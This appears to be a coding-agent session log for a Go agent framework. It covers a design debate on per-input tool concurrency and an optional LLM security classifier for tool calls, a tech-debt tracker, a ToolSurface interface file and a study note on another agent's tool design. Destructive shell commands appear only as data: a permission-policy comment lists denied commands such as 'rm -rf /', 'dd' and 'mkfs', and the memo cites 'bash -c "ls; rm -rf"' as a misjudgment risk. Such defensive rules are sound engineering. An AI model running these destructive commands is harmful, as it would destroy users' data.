**作者:** Claude (MiniMax-M3)
**立场:** 治本派 + 借鉴派平衡
**核心态度:** 2 个治本接受, 4 项 tech-debt 收口 OK, 但**默认全关的 GrowthBook + 借鉴 clawcode `inputsEquivalent` + LLM SideQuery auto-mode 是过度工程**, 需博弈裁剪

---

## 博弈点 1: per-input 函数 vs 字段化 metadata

**Claude 立场:** **per-input 函数 (clawcode 路线)**, 但要加 fail-safe 机制

- 字段化 (`ToolSpec.IsConcurrencySafePerInputMode enum`) 退化成"配置描述", 表达力不够 (bash 的 isReadOnly 是 command 解析问题, 不是配置问题)
- 函数化是唯一能处理 bash read-only detection / read_file size 判断 / write target path 互斥的方案
- **风险**: 抛错上抛 → 整个 turn 崩溃。AC6 fail-safe 强制要求 catch + false, 接受
- **额外建议**: 加 `IsConcurrencySafePanics` metric, 当 catch 到 panic 时记 1 次, **不要让 fail-safe 变成静默 bug 容器**

## 博弈点 2: auto-mode classifier 是否必要

**Claude 立场:** **P0 实施但默认关闭**, P1 之后根据实战数据决定是否打开

- VerifyContract 4 元组是 ground truth, **不可替换**
- auto-mode 是 **intermediate defense**, 在静态规则后、VerifyContract 前的"二次机会"
- 风险: LLM 幻觉, fail-open 默认 (5s timeout 后 allow) 不安全
- **关键设计**: SideQuery 必须用独立 LLM (避免主 LLM 自我审查), 5s timeout 硬上限, 默认 **OFF** (Production-Safety)
- **疑问**: 谁触发? 自动 (每个 tool_call)? 还是用户开关? 需求写"auto-mode", 但 P0 全关矛盾 — 需博弈

## 博弈点 3: tech-debt 收口策略

**Claude 立场:** **4 项一起收, 但 PR-F 单独立项**

- TD-STE-01 (混合批次并发) 跟 PR-B 强绑定, **必须 PR-B 一起**
- TD-STE-02 (Bash sibling abort) 单独 PR-F, 影响 Bash tool 语义
- TD-STE-03 (discard on fallback) 单独 PR-F, 依赖 TD-QL-03 已 CLOSED
- TD-STE-06 (ConcurrencySafe 注册表) 跟 PR-A 一起, 19 工具默认实现
- **理由**: PR-A/B 治本, PR-F 收债, 6 PR 划分清晰

## 博弈点 4: PR 拆分粒度

**Claude 立场:** **接受 6 PR, 但 PR-E 跟 PR-D 合并, 5 PR 即可**

- PR-D (classifier 集成) + PR-E (测试 + telemetry + e2e) **本质同一 PR**, 拆开会拉长回归期
- 5 PR 更紧凑: A interface / B partition / C ToAutoClassifier / D classifier+test+e2e / F GrowthBook+abort+discard+inputsEquivalent
- 反对意见: 6 PR 利于 review, 但 devrix 现状 (Hotfix 模式 + 用户验收) 5 PR 足够

## 博弈点 5: GrowthBook + inputsEquivalent 借鉴是否过度

**Claude 立场:** **GrowthBook 接受 (T25), inputsEquivalent (T28) 降级 P2 或 P3**

- GrowthBook runtime override 是 P0 (AC11), 但**默认全关 + Production-Safety** 的话, 实际是**死代码**。建议: GrowthBook **降 P2**, P0 阶段不接, 后续根据实际运营需要再启用
- `inputsEquivalent(a, b []byte) bool` (AC14 P2): 19 工具 × 3 case = 57 单测, **重复工作大, 价值小**。devrix ContentReplacementState (T04 已落地) 已经能感知内容变化, **inputsEquivalent 是它的弱化版**。建议**降 P3** 或直接删

## 借鉴 vs 保留创新 — 评估清单

| devrix 创新 | clawcode 借鉴 | Claude 评价 |
|------------|--------------|------------|
| EmissionClass 4 类路由 | 无 | ✅ 架构性, 保留 |
| VerifyContract 4 元组 | 无 (VerifyContract 是 devrix 独有) | ✅ 第一道安全, 保留 |
| MUPS 5 节点 | 无 | ✅ 保留 |
| Learn FeedbackMemory | 无 (clawcode 无 Learn 节点) | ✅ 保留 |
| LTL-Lite L4-L6 | 无 | ✅ 保留 |
| Token Design 2.0 | 无 | ✅ 保留 |
| ConvergenceContract 4 control plane | 无 | ✅ 保留 |
| IsConcurrencySafe 函数 | per-input 函数 | ✅ 接受 |
| partitionToolCalls | clawcode 真实做法 | ✅ 接受 |
| ToAutoClassifierInput | clawcode 真实做法 | ✅ 接受 |
| AutoModeClassifier | yoloClassifier | ✅ 接受, 默认关 |
| toCompactBlock JSONL | clawcode 真实做法 | ✅ 接受 |
| Bash sibling abort | clawcode 真实做法 | ✅ 接受 |
| StreamingToolExecutor.Discard() | 弱相关 (clawcode 无 discard) | ✅ 接受, TD-QL-03 已 CLOSED |
| **inputsEquivalent** | clawcode 35 字段 | ⚠️ 弱需求, 建议降 P3 |
| **GrowthBook override** | clawcode 无 (devrix 内部需求) | ⚠️ 默认全关是死代码, 建议降 P2 |

## 关键风险 (高 → 低)

1. **auto-mode classifier 默认关 = 死代码, 但 P0 强制实施** — 浪费工时
2. **Bash isReadOnly 误判** — 误把 `bash -c "ls; rm -rf"` 标并发, 缓解: 必须 parse 整个 command tree
3. **SideQuery LLM 不可用** — fail-open 不安全, 但 hard timeout 后 fail-open 是 clawcode 做法
4. **partitionToolCalls 改造破坏现有并发行为** — AC1 强制 19 工具默认保持 v2, 接受

## 共识诉求

- **三方共识**点: per-input 函数 + auto-mode classifier 默认关 + 6 PR 拆分 + 4 tech-debt 收口
- **争议**点: GrowthBook (P0 vs P2) + inputsEquivalent (P2 vs P3) + PR-D/E 是否合并 + auto-mode 谁触发
- **待用户裁决**: GrowthBook 降 P2? inputsEquivalent 删或降 P3? auto-mode 触发模式?


 succeeded in 0ms:
# Tech Debt: StreamingToolExecutor 二期对齐（clawcode 参照）

**来源：** clawcode `src/services/tools/StreamingToolExecutor.ts` vs Devrix `query/streaming_executor.go`
**主路径：** DM-20260610-012 QueryLoop（v1 基础版已交付）
**承载 change:** **DM-20260702-009 (D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier)** — 4 项关闭, 2 项保留
**状态:** 4/6 CLOSED (TD-STE-01/02/03/06) + 2/6 保留 (TD-STE-04/05, P2)
**优先级:** P0 (CLOSED 项) + P2 (保留项)

## 状态总览

| TD ID | 标题 | 状态 | 关闭路径 |
|-------|------|------|----------|
| TD-STE-01 | 混合批次调度 | **CLOSED** by DM-20260702-009 **T18** (partitionToolCalls) | 走 PR-B |
| TD-STE-02 | Bash sibling abort | **CLOSED** by DM-20260702-009 **T26** (siblingAbortController) | 走 PR-F |
| TD-STE-03 | fallback 时 discard 在途工具 | **CLOSED** by DM-20260702-009 **T27** (StreamingToolExecutor.Discard) | 走 PR-F (依赖 TD-QL-03 CLOSED, DM-20260618-010) |
| TD-STE-04 | 工具 progress 流 | 保留 P2 | OOS-NEW-7 |
| TD-STE-05 | synthetic error 统一 | 保留 P2 | OOS-NEW-8 |
| TD-STE-06 | ConcurrencySafe 注册表 | **CLOSED** by DM-20260702-009 **T16-T17** (per-input IsConcurrencySafe) | 走 PR-A |

## 背景

Devrix v1 `StreamingToolExecutor` 仅在 **整批工具全部 concurrency-safe** 时才并行。
clawcode 支持 **混合批次**（只读工具并行 + 写工具独占）、并行 Bash 兄弟取消、fallback discard、执行中 progress 流式输出。

## 现状 vs 目标 (历史快照, 已被本 doc 关闭)

| 能力 | Devrix v1 | clawcode | 目标 / 状态 |
|------|-----------|----------|------|
| 混合批次并发 | 全 safe 才并行 | safe 可与 safe 并行；unsafe 独占 | **TD-STE-01 → CLOSED T18** |
| Bash 并行 sibling abort | 无 | `siblingAbortController` | **TD-STE-02 → CLOSED T26** |
| fallback 时 discard 在途工具 | 无 | `discard()` + synthetic error | **TD-STE-03 → CLOSED T27** |
| 工具 progress 中途 yield | agent tool stream only | `pendingProgress` 即时 yield | TD-STE-04 保留 P2 |
| 合成 error 类型 | permission/exec | sibling_error / interrupted / streaming_fallback | TD-STE-05 保留 P2 |
| per-tool `isConcurrencySafe` | 硬编码 switch | 工具定义回调 | **TD-STE-06 → CLOSED T16-T17** |

---

## CLOSED 项 — 关闭记录

### TD-STE-01: 混合批次调度 — CLOSED by T18

**参考:** clawcode `canExecuteTool` + `processQueue`

**关闭路径:** DM-20260702-009 T18 partitionToolCalls 改造
- `internal/bootstrap/turn_adapter.go:277` 改造为 `partitionToolCalls` batch 模式
- batch 间串行 (LLM 顺序保留) + batch 内并发 (errgroup, 9 并发阈值)
- 仿 clawcode `src/services/tools/toolOrchestration.ts:84-118`

**关闭时间:** 计划 W1 D3-D5 (PR-B)

**回归基线:** `review50_e2e_concurrent_test.go` (T19) — 50 read_file 拆 ~10 batch, 总 wall time < 串行 / 3

### TD-STE-02: Bash sibling abort — CLOSED by T26

**参考:** clawcode `createChildAbortController(toolUseContext.abortController)`

**关闭路径:** DM-20260702-009 T26 BashTool siblingAbortController 集成
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` 新建
- 仅 abort 同 batch 并行 Bash 兄弟, **不** abort 父 QueryLoop turn
- 兄弟 Bash 返 synthetic `tool_result`: `Cancelled: parallel tool call errored`

**关闭时间:** 计划 W3 D1-D2 (PR-F)

**回归基线:** `sibling_abort_test.go` — mock 双 Bash, 第一个 error → 第二个 cancelled

### TD-STE-03: discard on fallback — CLOSED by T27

**触发:** QueryLoop fallback model 切换前 (依赖 TD-QL-03)

**关闭路径:** DM-20260702-009 T27 StreamingToolExecutor.Discard() + fallback 路径 wiring
- `internal/bootstrap/streaming_executor.go` 新建 — Discard() 方法
- `internal/bootstrap/discard_on_fallback.go` 新建 — QueryLoop fallback 路径 wiring
- 在途/queued 工具注入 `streaming_fallback` synthetic result
- 新 iteration 使用 fresh executor

**前置依赖:** TD-QL-03 (DM-20260618-010) — 已 CLOSED, 不再阻塞

**关闭时间:** 计划 W3 D1-D2 (PR-F)

**回归基线:** `discard_on_fallback_test.go` — fallback 路径无 orphan tool_use

### TD-STE-06: ConcurrencySafe 注册表 — CLOSED by T16-T17

**参考:** clawcode Tool interface 35 字段中 `isConcurrencySafe(input)`

**关闭路径:** DM-20260702-009 T16-T17 ToolSurface v4 + 19 工具默认实现
- `internal/shared/contracts/tool_surface_v4.go` 新建 — interface 扩展
- `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` 新建 — 19 工具默认
- 19 surface 加 `IsConcurrencySafe(input []byte) bool` 默认实现 (跟 clawcode TOOL_DEFAULTS 一致)

**关闭时间:** 计划 W1 D1-D2 (PR-A)

**回归基线:** `surface_metadata_gate_test.go` 加 1 case (AC8: 0 silent default)

---

## 保留项 (P2) — 走后续 change

### TD-STE-04: 工具 progress 流（P2）

- 长运行工具（bash、agent tool）可通过 context 注入 progress callback
- Executor 将 progress 作为 `tool_progress` 事件经 emit 上行（IM 可选展示）
- 走 OOS-NEW-7

### TD-STE-05: synthetic error 统一（P2）

| Reason | tool_result 语义 |
|--------|------------------|
| `sibling_error` | 并行兄弟失败取消 |
| `user_interrupted` | 用户拒绝/ESC |
| `streaming_fallback` | 模型 fallback 丢弃在途 |

- 走 OOS-NEW-8

---

## 详细字段 (历史记录, 关闭项参考)

### TD-STE-01 (CLOSED) 验收

- 单测：`read_file×2 + bash` → 两个 read 并行，bash 等 read 完成后执行
- 单测：仅 `bash×2` → 严格串行

### TD-STE-02 (CLOSED) 验收

- 集成测试 mock 双 Bash，第一个 error → 第二个 cancelled
- 单测: 第一个 error 后父 turn 仍继续 (不 cancel 父 ctx)
- 单测: 非 Bash 工具不被 abort (e.g. read_file 在同 batch 不受影响)

### TD-STE-03 (CLOSED) 验收

- 单测 fallback 路径无 orphan tool_use
- 单测: 无 fallback 时不触发 discard (无行为变化)

### TD-STE-06 (CLOSED) 验收

- 19 工具加 surface 默认 IsConcurrencySafe 实现
- `surface_metadata_gate_test.go` AC8 case PASS (0 silent default)

### TD-STE-04 (P2 保留) 验收

- 长运行工具调 progress callback → IM 收到 tool_progress 事件
- 单测: bash 跑 5s, 每 1s emit 一次 progress

### TD-STE-05 (P2 保留) 验收

- 3 种 synthetic error 类型在 tool_result 中可区分
- 单测: sibling_error / user_interrupted / streaming_fallback 各自 tool_result 语义

---

## 不在此 tech-debt

- QueryLoop 413/fallback 主链 → `queryloop-error-recovery.md` TD-QL-01~03 (TD-QL-03 已 CLOSED DM-20260618-010)
- Wave Worker cancel → DM-007 §12
- Background task stop → DM-20260611-009

## T 层登记 (关闭路径映射)

| T ID | Given-When-Then | 优先级 | 状态 |
|-------|-----------------|--------|------|
| D2-S8-T01 (DM-20260702-009 T18) | Given read×2+bash 同批 When ExecuteBatch Then read 并行且 bash 最后 | P0 | IMPLEMENTED (计划 W1 D3-D5) |
| D2-S8-T02 (DM-20260702-009 T26) | Given bash 并行首错 When sibling abort Then 第二 bash 合成 cancelled | P1 | IMPLEMENTED (计划 W3 D1-D2) |
| D2-S8-T03 (DM-20260702-009 T27) | Given fallback When discard Then 无 orphan tool_use | P1 | IMPLEMENTED (计划 W3 D1-D2) |
| D7-S9-A50-T16-T17 (DM-20260702-009) | Given 19 工具 When IsConcurrencySafe default Then per-input 决策 + 0 silent default | P0 | IMPLEMENTED (计划 W1 D1-D2) |

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/shared/contracts/tool_surface.go' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
package contracts

import (
	"context"
	"encoding/json"

	"github.com/devrix/devrix/internal/shared/types"
)

// ToolSpec is a neutral LLM tool schema (decoupled from D3 llmgateway.ToolCall
// and D2 tools.ToolSchema). All cross-layer tool exchanges use ToolSpec.
//
// DSAFT: TOOL-SURFACE-1-A01 (DM-20260617-007 devrix-tool-surface-contract)
// TOOL-SURFACE-1-A01-F02 (DM-20260618-001 devrix-tool-spec-enrichment):
//
//	4 orthogonal bool flags supplement the legacy Risk enum so that
//	PerAgentFilter / PerRiskFilter / turn_adapter can make fine-grained
//	decisions without parsing Risk strings.
type ToolSpec struct {
	Name        string
	Description string
	Parameters  string // JSON Schema
	Risk        types.RiskLevel

	// ReadOnly: tool does not modify the filesystem (read_file / glob / grep / lsp / verify).
	// PerAgentFilter consumes this to auto-extend the explore agent's visible set.
	ReadOnly bool

	// Destructive: tool performs irreversible operations (rm / force_push / delete_branch).
	// PerRiskFilter in plan_mode MAY consult this together with OpenWorld to decide
	// whether the LLM can call the tool without human confirmation.
	Destructive bool

	// OpenWorld: tool's side effects extend beyond the local machine
	// (web_fetch / send_im_message / free_fork spawning child agents).
	// PerRiskFilter uses this in plan_mode to drop the tool from the visible set.
	OpenWorld bool

	// ConcurrencySafe: multiple invocations of the same tool may run in parallel
	// without mutual interference (e.g. read_file on different paths).
	// turn_adapter.ExecuteRound uses this to decide parallel vs sequential dispatch.
	ConcurrencySafe bool

	// DeferLoading marks tools whose full schema is not sent to the LLM on
	// every turn. turn_adapter.Prepare filters these out of the system
	// prompt; the LLM must call tool_search to retrieve the schema on
	// demand. Empty / unused tools (delegate_*, *_background) get this
	// flag at BuildSurfaces time. Runtime ToolFilter.ShouldDefer can also
	// add it (e.g. plan_mode → defer all open-world tools).
	//
	// DSAFT: TOOL-SURFACE-1-A01-F08 (DM-20260618-003 devrix-surface-lazy-loading).
	DeferLoading bool

	// --- ToolSpec v3 (D2-S15-A02-T06): 6 control plane fields ---
	// DSAFT: D2-S15-A02-T06 — control plane; runtime-bound; defaults in tool_surface_v3.go.
	EmissionClass       EmissionClass       `json:"emission_class"`
	ConvergenceContract ConvergenceContract `json:"convergence_contract"`
	IterationBound      IterationBound      `json:"iteration_bound"`
	SourceUncertainty   SourceUncertainty   `json:"source_uncertainty"`
	MaxResultSizeChars  int                 `json:"max_result_size_chars"`
	TruncateMarkerText  string              `json:"truncate_marker_text"`
}

// ToolResult is the return type of ToolSurface.Execute.
//
// DSAFT: TOOL-SURFACE-1-A01-F04
type ToolResult struct {
	Output string
	Error  string
}

// InterruptMode describes how a tool responds to a context cancellation signal.
//
// DSAFT: TOOL-SURFACE-1-A01-F05 (DM-20260618-001 devrix-tool-spec-enrichment).
// The 1:1 mapping with clawcode Tool.interruptBehavior (Tool.ts:410-416)
// lets long-run tools opt out of waiting for natural completion when the
// user issues a new message mid-turn.
type InterruptMode string

const (
	// InterruptCancel: the surface MUST select on ctx.Done() and return
	// ctx.Err() within 200ms of cancellation.
	InterruptCancel InterruptMode = "cancel"

	// InterruptBlock: the surface ignores ctx cancellation and runs to
	// natural completion. The default for short-run tools.
	InterruptBlock InterruptMode = "block"
)

// ToolSurface is a discoverable entry point for a group of related tools.
//
// Per devrix Facet Decomposition (DM-020 D-c + architecture-design.md §1.1),
// ToolSurface is a 拆面 contract exposed to D2 (consumer) by D2 surface
// implementations. Library packages (freefork / tracker / verify / etc.) do
// not depend on this contract — the dependency direction is:
//
//	contracts ← surface (in tools/surface) ← library
//
// Design principles:
//   - Accept interfaces, return structs (ToolSpec / ToolResult are structs)
//   - 6 methods, each 1-3 lines in typical implementations
//   - Does not hold ctx; Execute / Tools accept ctx
//   - Does NOT make permission decisions (IPermissionGate runs in
//     turn_adapter.ExecuteRound, BEFORE surf.Execute)
//
// DSAFT: TOOL-SURFACE-1-A01 (DM-20260617-007) + TOOL-SURFACE-1-A01-F05
// (DM-20260618-001 — InterruptBehavior addition) +
// TOOL-SURFACE-1-A01-F07 (DM-20260618-002 — CheckPermission addition).
type ToolSurface interface {
	// Name returns the surface identifier (used in devrix.yaml config,
	// log tags, and `devrix tool list` output).
	Name() string

	// Tools returns the list of tools this surface exposes for the given
	// (workDir, sessionID) context. Implementations may filter
	// conditionally (e.g. LSPToolSurface checks lsp.enabled).
	//
	// The returned slice should be deterministic for stable LLM tool
	// schema hashing (callers may cache it per session).
	Tools(ctx context.Context, workDir, sessionID string) []ToolSpec

	// RiskLevel returns the RiskLevel for a single tool name. Unknown
	// names return types.RiskLevelLow (defensive default).
	//
	// Called by turn_adapter.ExecuteRound to populate
	// IPermissionGate.Request's risk argument.
	RiskLevel(name string) types.RiskLevel

	// Execute dispatches a single tool call through the surface's
	// internal mechanism. Returns ToolResult{Output, Error}; non-empty
	// Error means the caller should not block.
	//
	// workDir and sessionID are passed explicitly (not via ctx value) so
	// surfaces do not need to know about D1/D2 ctx conventions.
	Execute(ctx context.Context, name, input, workDir string) (*ToolResult, error)

	// InterruptBehavior returns the interrupt mode for the named tool.
	// Long-run tools (FreeForkSurface.free_fork) MUST return InterruptCancel
	// and select on ctx.Done() inside Execute; everything else returns
	// InterruptBlock by convention.
	//
	// The default is InterruptBlock (existing 7 surfaces); only surfaces
	// that genuinely run >5s in normal use override this.
	InterruptBehavior(name string) InterruptMode

	// CheckPermission is the per-tool pre-dispatch hook. turn_adapter
	// calls it BEFORE Execute; a non-Allow decision skips Execute and
	// the LLM gets a PermissionDeniedError / PermissionAskRequiredError
	// envelope in result.Results[i].Error.
	//
	// 5 surfaces return Allow unconditionally (read-only / stateless
	// tools). 2 surfaces override:
	//   - BuiltinSurface  → BashASTPolicy parses the command and
	//     denies rm -rf /, dd, mkfs, sudo, chmod 777 /.
	//   - FreeForkSurface → delegates to IPermissionGate.CheckPermission
	//     (multi-agent spawns need the global policy).
	//
	// Performance budget: < 5ms p99 (BashASTPolicy is the hot path).
	// DSAFT: TOOL-SURFACE-1-A01-F07 (DM-20260618-002).
	CheckPermission(ctx context.Context, spec ToolSpec, input json.RawMessage) Decision
}

codex
Now let me read the clawcode reference and check key implementation files.

exec
/bin/zsh -lc 'cat /Users/fukai/brain/01知识探索/项目/20260620-certain-architecture/core-concepts/53-clawcode-tools-design.md' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
---
title: "Clawcode Tools 设计深读：42 工具逐个精读 + 23 个 Bash 安全 check"
date: 2026-06-25
project: clawcode-devrix
category: core-concepts
related:
  - "[[../core-concepts/38-mature-uncertainty-methodology]]"
  - "[[../discussion-drafts/40-clawcode-mups-v4-mapping]]"
  - "[[../core-concepts/49-clawcode-subagent-design]]"
  - "[[../core-concepts/50-clawcode-memory-system]]"
  - "[[../core-concepts/51-clawcode-context-engine]]"
  - "[[../core-concepts/52-clawcode-session-memory]]"
  - "[[../project-application/34-d7-ideal-architecture-and-implementation]]"
source_anchors:
  - clawcode/src/Tool.ts:1-792
  - clawcode/src/tools.ts:1-389
  - clawcode/src/tools/BashTool/BashTool.tsx:1-1303
  - clawcode/src/tools/BashTool/bashSecurity.ts:1-2592
  - clawcode/src/tools/BashTool/bashPermissions.ts:1-2621
  - clawcode/src/tools/BashTool/readOnlyValidation.ts:1-1990
  - clawcode/src/tools/BashTool/sedValidation.ts:1-684
  - clawcode/src/tools/BashTool/pathValidation.ts:1-1303
  - clawcode/src/tools/FileReadTool/FileReadTool.ts:1-1183
  - clawcode/src/tools/FileEditTool/FileEditTool.ts:1-625
  - clawcode/src/tools/FileEditTool/types.ts:1-85
  - clawcode/src/tools/FileEditTool/utils.ts:1-775
  - clawcode/src/tools/FileWriteTool/FileWriteTool.ts:1-?
  - clawcode/src/tools/GrepTool/GrepTool.ts:1-577
  - clawcode/src/tools/GlobTool/GlobTool.ts:1-?
  - clawcode/src/tools/WebFetchTool/WebFetchTool.ts:1-318
  - clawcode/src/tools/WebSearchTool/WebSearchTool.ts:1-?
  - clawcode/src/tools/SyntheticOutputTool/SyntheticOutputTool.ts:1-163
  - clawcode/src/tools/ToolSearchTool/ToolSearchTool.ts:1-471
  - clawcode/src/tools/LSPTool/LSPTool.ts:1-?
  - clawcode/src/tools/NotebookEditTool/NotebookEditTool.ts:1-?
  - clawcode/src/tools/EnterPlanModeTool/EnterPlanModeTool.ts:1-?
  - clawcode/src/tools/ExitPlanModeTool/ExitPlanModeV2Tool.ts:1-?
  - clawcode/src/tools/EnterWorktreeTool/EnterWorktreeTool.ts:1-?
  - clawcode/src/tools/ExitWorktreeTool/ExitWorktreeTool.ts:1-?
  - clawcode/src/tools/SkillTool/SkillTool.ts:1-?
  - clawcode/src/tools/AskUserQuestionTool/AskUserQuestionTool.ts:1-?
  - clawcode/src/tools/TodoWriteTool/TodoWriteTool.ts:1-?
  - clawcode/src/tools/ConfigTool/ConfigTool.ts:1-?
  - clawcode/src/tools/TaskCreateTool/TaskCreateTool.ts:1-?
  - clawcode/src/tools/BriefTool/BriefTool.ts:1-?
tags: [clawcode, tools, tool-interface, buildTool, cache-stable, permission, lazy-schema, bash-security, file-dedup]
status: draft
---

# Clawcode Tools 设计深读：42 工具逐个精读 + 23 个 Bash 安全 check

> 基于 Clawcode（Anthropic Claude Code v2.1.88）源码逐行阅读，聚焦"42 工具的逐个精读 + Tool 接口 35 字段 + buildTool 工厂 + cache-stable 装配"。BashTool 单工具独占 13000 行（含 23 个安全 check），整体工具体系总规模 16000+ 行。

---

## 0. 一句话总结

Clawcode Tools 是一套**以 Tool 接口 + buildTool 工厂 + assembleToolPool cache-stable 装配**为核心的工程化框架：

- **42 个工具**分 6 类别（文件 / Shell / 检索 / Web / 编排 / 辅助）
- **35 接口字段**（Tool.ts）+ **7 个 buildTool 默认值**（fail-closed 设计）
- **lazySchema** 避免 zod 编译时评估
- **cache-stable 装配**：partition-sort-byName 保证 wire byte-stable
- **三态判定**：isConcurrencySafe / isReadOnly / isDestructive 决定并发/持久化/权限
- **BashTool 23 个安全 check** 防 sandbox escape、compound bypass、zsh 特有攻击

整套设计哲学：**让每个工具用同一套元数据自我描述，把决策权交给上层框架**。

---

## 1. 42 工具全景

### 1.1 6 类别分组

| 类别 | 工具 | 数量 |
|------|------|------|
| **文件 I/O** | FileReadTool / FileWriteTool / FileEditTool / NotebookEditTool | 4 |
| **Shell** | BashTool / PowerShellTool | 2 |
| **检索** | GrepTool / GlobTool / LSPTool | 3 |
| **Web** | WebFetchTool / WebSearchTool | 2 |
| **编排** | AgentTool / SendMessageTool / TaskCreateTool / TaskGetTool / TaskListTool / TaskUpdateTool / TaskOutputTool / TaskStopTool / TeamCreateTool / TeamDeleteTool | 10 |
| **Plan/Worktree** | EnterPlanModeTool / ExitPlanModeTool / ExitPlanModeV2Tool / EnterWorktreeTool / ExitWorktreeTool | 5 |
| **MCP** | MCPTool / ListMcpResourcesTool / ReadMcpResourceTool / McpAuthTool | 4 |
| **辅助** | SkillTool / ToolSearchTool / TodoWriteTool / AskUserQuestionTool / ConfigTool / BriefTool / RemoteTriggerTool / ScheduleCronTool（CronCreate/Delete/List）/ SyntheticOutputTool / REPLTool（ant-only）/ SuggestBackgroundPRTool（ant-only）/ SleepTool / MonitorTool / SendUserFileTool / PushNotificationTool / SubscribePRTool | 16 |

### 1.2 加载模式（5 种）

| 模式 | 例子 | 触发条件 |
|------|------|---------|
| 静态 import | FileReadTool / FileEditTool / AgentTool | 总是加载 |
| `feature()` 懒加载 | SleepTool / cronTools / MonitorTool / SendUserFileTool | bun:bundle 编译期裁剪 + GB flag |
| `process.env.USER_TYPE === 'ant'` | REPLTool / SuggestBackgroundPRTool | ant-only |
| 懒 require 破环依赖 | TeamCreateTool / TeamDeleteTool / SendMessageTool | tools.ts 反向依赖 |
| conditional 创建 | SyntheticOutputTool | `isSyntheticOutputToolEnabled()` 守门 |

### 1.3 shouldDefer 工具（动态加载）

只有 4 个：`WebFetchTool` / `LSPTool` / `EnterPlanModeTool` / `ExitPlanModeV2Tool` / `TaskCreateTool`（TodoWrite v2 启用时）/ `SkillTool`（部分场景）。需 ToolSearch 解锁。

---

## 2. Tool 接口：35 字段核心契约（Tool.ts:362-701）

### 2.1 必填字段（5 个）

```ts
type Tool = {
  readonly name: string                // 主名 'Bash' | 'FileRead' | ...
  readonly inputSchema: Input          // Zod schema
  readonly maxResultSizeChars: number  // 持久化阈值（Infinity = 不持久化）
  
  call(args, context, canUseTool, parentMessage, onProgress): Promise<ToolResult<Output>>
  description(input, options): Promise<string>
  
  // 还有 30 个可选字段...
}
```

### 2.2 7 元数据判定字段

```ts
isConcurrencySafe(input): boolean        // 可并发派发（默认 false = 串行）
isReadOnly(input): boolean              // 只读（默认 false = 写入）
isDestructive?(input): boolean          // 不可逆（默认 false）
interruptBehavior?(): 'cancel' | 'block'  // 用户发新消息时行为（默认 'block'）
isSearchOrReadCommand?(input): { isSearch, isRead, isList? }  // UI 折叠
isOpenWorld?(input): boolean            // 影响权限判定
isEnabled(): boolean                    // 运行时 gate
```

### 2.3 权限与匹配

```ts
checkPermissions(input, context): Promise<PermissionResult>  // 工具特定权限
preparePermissionMatcher?(input): Promise<(pattern) => boolean>  // hook if 条件匹配
getPath?(input): string  // 文件路径提取
```

### 2.4 模型/UI 渲染字段（11 个）

| 字段 | 用途 |
|------|------|
| `prompt(options)` | 系统 prompt 中此工具的详细说明 |
| `userFacingName(input)` | UI 显示名 |
| `userFacingNameBackgroundColor?(input)` | 颜色主题 |
| `getToolUseSummary?(input)` | 一行摘要 |
| `getActivityDescription?(input)` | spinner 描述 |
| `renderToolUseMessage(input, options)` | 工具调用 UI |
| `renderToolResultMessage?(content, progress, options)` | 结果 UI |
| `renderToolUseErrorMessage?(...)` | 错误 UI |
| `renderToolUseRejectedMessage?(...)` | 拒绝 UI |
| `renderToolUseProgressMessage?(...)` | 进度 UI |
| `renderGroupedToolUse?(uses, options)` | 并行实例折叠 |
| `renderToolUseQueuedMessage?()` | 队列等待 UI |
| `renderToolUseTag?(input)` | 元数据标签 |
| `isResultTruncated?(output)` | 是否可展开 |

### 2.5 提示词与缓存优化

```ts
toAutoClassifierInput(input): unknown         // auto-mode 分类器输入
mapToolResultToToolResultBlockParam(content, toolUseID): ToolResultBlockParam
extractSearchText?(output): string             // transcript 搜索索引
backfillObservableInput?(input): void          // 规范化输入给 hook/SDK 看
inputsEquivalent?(a, b): boolean               // 等价输入判定
```

### 2.6 ToolSearch 集成

```ts
searchHint?: string        // 3-10 关键词
shouldDefer?: boolean      // true = 需要 ToolSearch 解锁
alwaysLoad?: boolean       // true = 即使 ToolSearch 启用也必出现
aliases?: string[]         // 重命名兼容
isMcp?: boolean           // MCP 工具标记
isLsp?: boolean           // LSP 工具标记
mcpInfo?: { serverName, toolName }  // MCP 元数据
```

### 2.7 持久化与严格模式

```ts
outputSchema?: ZodType<unknown>  // 结构化输出验证
strict?: boolean                  // API strict mode（依赖 tengu_tool_pear feature）
```

### 2.8 子代理与权限流字段

```ts
requiresUserInteraction?(): boolean  // 工具是否需要用户 UI 交互
isTransparentWrapper?(): boolean     // 透明 wrapper（如 REPL）
```

---

## 3. buildTool 工厂：默认值填充（Tool.ts:783-791）

### 3.1 工厂签名

```ts
export function buildTool<D extends AnyToolDef>(def: D): BuiltTool<D> {
  return { ...TOOL_DEFAULTS, userFacingName: () => def.name, ...def } as BuiltTool<D>
}
```

### 3.2 7 个 fail-closed 默认值

| 默认 | 含义 | 安全语义 |
|------|------|---------|
| `isEnabled: () => true` | 默认启用 | — |
| `isConcurrencySafe: () => false` | 默认串行 | **fail-closed** |
| `isReadOnly: () => false` | 默认写入 | **fail-closed** |
| `isDestructive: () => false` | 默认非破坏 | — |
| `checkPermissions: () => allow` | 默认允许 | 由通用 cascade 接管 |
| `toAutoClassifierInput: () => ''` | 默认跳过分类器 | **fail-closed** |
| `userFacingName: () => def.name` | 默认用 name | — |

注释（Tool.ts:761-769）：

> Defaults (fail-closed where it matters):
> - isConcurrencySafe → false (assume not safe)
> - isReadOnly → false (assume writes)
> - toAutoClassifierInput → '' (skip classifier — security-relevant tools must override)

**关键原则**：所有 60+ 工具 export 都走 buildTool，**默认值集中在一个地方**——避免每处写 `?? default`。

### 3.3 BuiltTool 类型层

```ts
type BuiltTool<D> = Omit<D, DefaultableToolKeys> & {
  [K in DefaultableToolKeys]-?: K extends keyof D
    ? undefined extends D[K]
      ? ToolDefaults[K]    // D 提供但 undefined → 默认值
      : D[K]               // D 提供 → D 的类型
    : ToolDefaults[K]      // D 省略 → 默认值
}
```

**类型技巧**：mapped type 区分"D 提供"vs"D 省略"vs"D 提供但 undefined"——返回类型总是 complete Tool。

---

## 4. ToolUseContext：35 字段运行时上下文（Tool.ts:158-301）

### 4.1 三组字段

| 分组 | 字段数 | 关键字段 |
|------|------|----------|
| **options** | 15 | commands / mainLoopModel / tools / thinkingConfig / mcpClients / agentDefinitions / customSystemPrompt / appendSystemPrompt / querySource / refreshTools |
